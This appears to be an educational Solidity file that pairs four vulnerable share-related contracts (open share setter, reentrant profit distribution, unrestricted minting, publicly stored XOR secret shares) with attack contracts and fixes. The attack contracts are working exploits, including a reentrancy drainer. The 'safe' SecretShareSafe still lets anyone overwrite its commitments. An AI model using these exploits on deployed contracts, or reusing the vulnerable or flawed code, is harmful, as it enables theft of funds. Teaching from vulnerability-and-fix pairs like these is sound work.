// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

//////////////////////////////////////////////////////////////
//                         ERRORS
//////////////////////////////////////////////////////////////
error SH_PUBLIC__NotOwner();
error SH_PROFIT__ZeroShares();
error SH_TOKEN__NotOwner();
error SH_SECRET__BadCommit();

//////////////////////////////////////////////////////////////
// 1) PUBLIC SHARE REGISTRY
//////////////////////////////////////////////////////////////
// Vulnerable: anyone can set any user’s share
contract PublicShareVuln {
    mapping(address => uint256) public share;
    event ShareSet(address indexed who, uint256 amount);

    function setShare(address who, uint256 amount) external {
        share[who] = amount;
        emit ShareSet(who, amount);
    }
}

// Attack: hijack another user’s share
contract Attack_PublicShare {
    PublicShareVuln public target;
    constructor(PublicShareVuln _t) { target = _t; }
    function exploit(address victim, uint256 amt) external {
        target.setShare(victim, amt);
    }
}

// Safe: only owner can set shares
contract PublicShareSafe {
    mapping(address => uint256) public share;
    address public immutable owner;
    event ShareSet(address indexed who, uint256 amount);

    constructor() { owner = msg.sender; }

    function setShare(address who, uint256 amount) external {
        if (msg.sender != owner) revert SH_PUBLIC__NotOwner();
        share[who] = amount;
        emit ShareSet(who, amount);
    }
}

//////////////////////////////////////////////////////////////
// 2) PROFIT SHARING VAULT
//////////////////////////////////////////////////////////////
// Vulnerable: reentrancy in distribution loop
contract ProfitShareVuln {
    mapping(address => uint256) public shares;
    address[] public holders;
    uint256 public totalShares;

    constructor(address[] memory _holders, uint256[] memory _shares) payable {
        require(_holders.length == _shares.length, "len");
        for (uint i; i < _holders.length; ++i) {
            holders.push(_holders[i]);
            shares[_holders[i]] = _shares[i];
            totalShares += _shares[i];
        }
    }

    receive() external payable {}

    function distribute() external {
        uint256 bal = address(this).balance;
        require(totalShares > 0, "no shares");
        for (uint i; i < holders.length; ++i) {
            address h = holders[i];
            uint256 pay = bal * shares[h] / totalShares;
            (bool ok,) = h.call{value: pay}("");
            require(ok, "xfer fail");
        }
    }
}

// Attack: malicious holder reenters distribute()
contract Attack_ProfitShareReentrancy {
    ProfitShareVuln public target;
    constructor(ProfitShareVuln _t) { target = _t; }
    receive() external payable {
        // reenter until drained
        if (address(target).balance > 0) {
            target.distribute();
        }
    }
    function exploit() external payable {
        require(msg.value > 0);
        // fund the vault and trigger distribution
        payable(address(target)).transfer(msg.value);
        target.distribute();
    }
}

// Safe: pull‑payout pattern
contract ProfitShareSafe {
    mapping(address => uint256) public shares;
    address[] public holders;
    uint256 public totalShares;
    mapping(address => uint256) public pending;
    bool public distributed;
    event Distributed(uint256 total);
    event Withdrawn(address indexed who, uint256 amount);

    constructor(address[] memory _holders, uint256[] memory _shares) payable {
        require(_holders.length == _shares.length, "len");
        for (uint i; i < _holders.length; ++i) {
            holders.push(_holders[i]);
            shares[_holders[i]] = _shares[i];
            totalShares += _shares[i];
        }
    }

    receive() external payable {}

    function distribute() external {
        require(!distributed, "already");
        uint256 bal = address(this).balance;
        require(totalShares > 0, "no shares");
        for (uint i; i < holders.length; ++i) {
            address h = holders[i];
            pending[h] = bal * shares[h] / totalShares;
        }
        distributed = true;
        emit Distributed(bal);
    }

    function withdraw() external {
        uint256 amt = pending[msg.sender];
        require(amt > 0, "zero");
        pending[msg.sender] = 0;
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok, "xfer fail");
        emit Withdrawn(msg.sender, amt);
    }
}

//////////////////////////////////////////////////////////////
// 3) SHARE TOKEN (ERC20)
//////////////////////////////////////////////////////////////
abstract contract ERC20 {
    mapping(address => uint256) public balanceOf;
    event Transfer(address indexed from, address indexed to, uint256 value);
    function _mint(address to, uint256 amt) internal {
        balanceOf[to] += amt;
        emit Transfer(address(0), to, amt);
    }
    function transfer(address to, uint256 amt) public returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        emit Transfer(msg.sender, to, amt);
        return true;
    }
}

// Vulnerable: anyone can mint unlimited shares
contract ShareTokenVuln is ERC20 {
    function mint(uint256 amt) external {
        _mint(msg.sender, amt);
    }
}

// Attack: mint massive supply
contract Attack_ShareTokenMint {
    ShareTokenVuln public token;
    constructor(ShareTokenVuln _t) { token = _t; }
    function exploit(uint256 amt) external {
        token.mint(amt);
    }
}

// Safe: only owner can mint
contract ShareTokenSafe is ERC20 {
    address public immutable owner;
    error SH_TOKEN__NotOwner();
    event Minted(address indexed to, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amt) external {
        if (msg.sender != owner) revert SH_TOKEN__NotOwner();
        _mint(to, amt);
        emit Minted(to, amt);
    }
}

//////////////////////////////////////////////////////////////
// 4) SECRET SHARE (XOR‑BASED)
//////////////////////////////////////////////////////////////
// Vulnerable: shares stored publicly, reveal leaks secret
contract SecretShareVuln {
    bytes32 public share1;
    bytes32 public share2;

    function setShares(bytes32 s1, bytes32 s2) external {
        share1 = s1;
        share2 = s2;
    }
    function reveal() external view returns (bytes32) {
        return share1 ^ share2;
    }
}

// Attack: simply call reveal()
contract Attack_SecretShare {
    SecretShareVuln public target;
    constructor(SecretShareVuln _t) { target = _t; }
    function exploit() external view returns (bytes32) {
        return target.reveal();
    }
}

// Safe: store only commitments; require correct preimages to reveal
contract SecretShareSafe {
    bytes32 private comm1;
    bytes32 private comm2;
    event Committed(bytes32 comm1, bytes32 comm2);

    function commit(bytes32 _h1, bytes32 _h2) external {
        comm1 = _h1;
        comm2 = _h2;
        emit Committed(_h1, _h2);
    }

    function reveal(bytes32 s1, bytes32 s2) external view returns (bytes32) {
        if (keccak256(abi.encodePacked(s1)) != comm1 ||
            keccak256(abi.encodePacked(s2)) != comm2) {
            revert SH_SECRET__BadCommit();
        }
        return s1 ^ s2;
    }
}
